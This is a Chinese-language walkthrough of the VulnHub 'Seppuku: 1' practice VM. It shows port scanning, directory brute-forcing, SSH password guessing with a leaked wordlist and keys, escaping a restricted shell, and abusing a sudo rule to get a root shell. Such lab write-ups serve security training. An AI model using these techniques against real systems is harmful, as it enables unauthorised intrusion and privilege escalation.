# Seppuku: 1

2024-5-22 https://www.vulnhub.com/entry/seppuku-1,484/

difficulty: Intermediate to Hard

## IP

192.168.10.186

## Scan

Open Port -> 21,22,80,139,445,7080,7601,8088

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 cd55a8e40f28bcb2a67d4176bb9f71f4 (RSA)
|   256 16fa29e4e08a2e7d37d26f42b2dce922 (ECDSA)
|_  256 bb74e897fa308ddaf95c99f0d9248ad5 (ED25519)
80/tcp   open  http        nginx 1.14.2
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-server-header: nginx/1.14.2
|_http-title: 401 Authorization Required
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
7080/tcp open  ssl/http    LiteSpeed httpd
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
| ssl-cert: Subject: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
| Not valid before: 2020-05-13T06:51:35
|_Not valid after:  2022-08-11T06:51:35
|_http-server-header: LiteSpeed
|_http-title:  404 Not Found
7601/tcp open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Seppuku
8088/tcp open  http        LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Seppuku
```

开放端口较多，可能有坑。

21 ftp 端口不能匿名登陆。

看看 smb 有什么：

```
enum4linux -a 192.168.10.186

S-1-22-1-1000 Unix User\seppuku (Local User)
S-1-22-1-1001 Unix User\samurai (Local User)
S-1-22-1-1002 Unix User\tanto (Local User)
```

枚举到了 linux 中的 3 个用户。

先看看 80 上的 web 有什么, http://192.168.10.186/ 访问后，需要 http-basic 认证，我们没有用户名和密码，暂时没啥用。

7080 也是个 web 服务 ssl 端口，gobuster 扫描全部返回 403，估计是个坑。

8088 使用 gobuster 扫描看看，能有什么信息：

```
http://192.168.10.186:8088/index.html           (Status: 200) [Size: 171]
http://192.168.10.186:8088/cgi-bin              (Status: 301) [Size: 1260] [--> http://192.168.10.186:8088/cgi-bin/]
http://192.168.10.186:8088/docs                 (Status: 301) [Size: 1260] [--> http://192.168.10.186:8088/docs/]
http://192.168.10.186:8088/index.php            (Status: 200) [Size: 163188]
http://192.168.10.186:8088/blocked              (Status: 301) [Size: 1260] [--> http://192.168.10.186:8088/blocked/]
```

http://192.168.10.186:8088/index.php 是一个模拟了 ssh 登陆的页面，需要输入用户名和密码。

7601 端口也是个 apache 服务，使用 gobuster 进行扫描：

```
http://192.168.10.186:7601/a                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/a/]
http://192.168.10.186:7601/c                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/c/]
http://192.168.10.186:7601/b                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/b/]
http://192.168.10.186:7601/t                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/t/]
http://192.168.10.186:7601/r                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/r/]
http://192.168.10.186:7601/d                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/d/]
http://192.168.10.186:7601/f                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/f/]
http://192.168.10.186:7601/e                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/e/]
http://192.168.10.186:7601/h                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/h/]
http://192.168.10.186:7601/w                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/w/]
http://192.168.10.186:7601/q                    (Status: 301) [Size: 319] [--> http://192.168.10.186:7601/q/]
http://192.168.10.186:7601/database             (Status: 301) [Size: 326] [--> http://192.168.10.186:7601/database/]
http://192.168.10.186:7601/production           (Status: 301) [Size: 328] [--> http://192.168.10.186:7601/production/]
http://192.168.10.186:7601/keys                 (Status: 301) [Size: 322] [--> http://192.168.10.186:7601/keys/]
http://192.168.10.186:7601/secret               (Status: 301) [Size: 324] [--> http://192.168.10.186:7601/secret/]
http://192.168.10.186:7601/stg                  (Status: 301) [Size: 321] [--> http://192.168.10.186:7601/stg/]
```

http://192.168.10.186:7601/w/password.lst 存在一个像是密码字典的文件，下载到 kali 上。

http://192.168.10.186:7601/production/ 显示的是一个 Siimple 的 cms，经过验证，没找到这个 CMS 有什么漏洞。

http://192.168.10.186:7601/keys/ 显示了两个 ssh 的 key 文件，不知道能不能用，先下载到 kali 上。

http://192.168.10.186:7601/secret/ 显示了一堆文件，展示的是什么 shadow 和 passwd 文件，经过验证，这两个文件都是坑，没用。

尝试使用上面获得的 3 个用户和 password.lst，进行 ssh 爆破，得到了一个用户凭据:login: seppuku password: eeyoree

使用此用户，登陆 ssh，在 home 目录发现.passwd 文件：

```
seppuku@seppuku:~$ cat .passwd
12345685213456!@!@A
```

cd 时，发现 bash 被限制：

```
seppuku@seppuku:~$ cd /home
-rbash: cd: restricted
```

重新登陆 ssh，设置 bash：

```
ssh seppuku@192.168.10.186 -t "bash --noprofile"
```

登陆后，获得了正常的交互式 bash。

开始进行系统枚举：

/home 目录中的其他两个用户 samurai 和 tanto 本地文件夹中没有有用信息。cap、crontab、suid 中没有可利用信息。

sudo 权限：

```
(ALL) NOPASSWD: /usr/bin/ln -sf /root/ /tmp/
```

执行上面命令，可以将 /root/ 目录软连接到/tmp 上，但是执行后，在/tmp 中，也不能 cd 到 root，应该是个坑，估计这个用户应该没有其他路径提权到 root。

使用上面得到的密码，尝试切换到其他两个用户，看看密码对不对，经过尝试 samurai 的密码是 12345685213456!@!@A

看看 samurai 有没有提权到 root 的路径，还是老问题，bash 被限制，重新登陆 ssh：

```
ssh samurai@192.168.10.186 -t "bash --noprofile"
```

登陆后，sudo -l 发现了另外的线索：

```
(ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```

但是 /../../../../../../home/tanto/.cgi_bin/bin 这个文件不存在，而且也没权限在 tanto 目录中创建这个文件，估计还是坑。

现在要想办法切换到 tanto 用户，还记得 http://192.168.10.186:7601/keys/ 这里现实了 2 个私钥，看看能不登陆 tando 吧，2 个文件内容一样，用其中一个，权限改成 600.

登陆成功：

```
ssh -i private.txt tanto@192.168.10.186 -t "bash --noprofile"
```

这时，就可以创建 /home/tanto/.cgi_bin/bin 文件：

```
mkdir -p /home/tanto/.cgi_bin && echo '/bin/bash' > /home/tanto/.cgi_bin/bin && chmod +x /home/tanto/.cgi_bin/bin
```

然后在回到 samurai 用户，执行 sudo：

```
samurai@seppuku:/tmp$ sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*
root@seppuku:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@seppuku:/tmp# cd /root
root@seppuku:~# ls
root.txt
root@seppuku:~# cat root.txt
{SunCSR_Seppuku_2020_X}
```

这靶场就是一直在绕你，绕来绕去.....
